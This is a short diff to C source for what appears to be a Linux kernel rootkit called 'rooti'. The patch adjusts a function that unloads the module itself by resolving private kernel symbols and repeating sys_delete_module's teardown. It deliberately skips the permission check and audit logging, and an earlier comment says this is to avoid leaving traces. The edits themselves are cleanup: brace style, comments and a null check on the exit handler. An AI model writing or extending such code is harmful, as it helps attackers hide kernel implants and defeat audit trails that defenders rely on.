@@ -20,16 +20,19 @@ static int __try_release_module_ref(struct module *mod)
 {
 	int ret = atomic_sub_return(MODULE_REF_BASE, &mod->refcnt);
 	BUG_ON(ret < 0);
-	if (ret) {
+	if (ret)
 		ret = atomic_add_unless(&mod->refcnt, MODULE_REF_BASE, 0);   
-    }
+
 	return ret;
 }
 
 /*
-	This function is similar to sys_delete_module() but without access to userspace memory and
-	without some logging calls that leave traces of this module. It performs all teardown operations
-	immediately and schedules the deallocation of the modules memory to a background workqueue.
+	This function is almost identical to sys_delete_module(), minus mainly the following:
+	* user permission check
+	* module lookup by name (via userspace string)
+	* audit logging
+	It performs all teardown operations immediately and schedules the deallocation
+	of the modules memory to a background workqueue.
 */
 static int rooti_schedule_self_unloading(void) {
 	ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);
@@ -51,7 +54,7 @@ static int rooti_schedule_self_unloading(void) {
 		return -EBUSY;
 	}
 
-	// Inlined try_stop_module() function
+	// Inlined try_stop_module() function without force unloading option
 	if (__try_release_module_ref(THIS_MODULE) != 0) {
 		mutex_unlock(__module_mutex);
 		return -EWOULDBLOCK;
@@ -59,8 +62,9 @@ static int rooti_schedule_self_unloading(void) {
 	THIS_MODULE->state = MODULE_STATE_GOING;
 
 	mutex_unlock(__module_mutex);
+	if (THIS_MODULE->exit != NULL)
+		THIS_MODULE->exit();
 	blocking_notifier_call_chain(__module_notify_list, MODULE_STATE_GOING, THIS_MODULE);
-	THIS_MODULE->exit();
 
 	__klp_module_going(THIS_MODULE);
 	__ftrace_release_mod(THIS_MODULE);
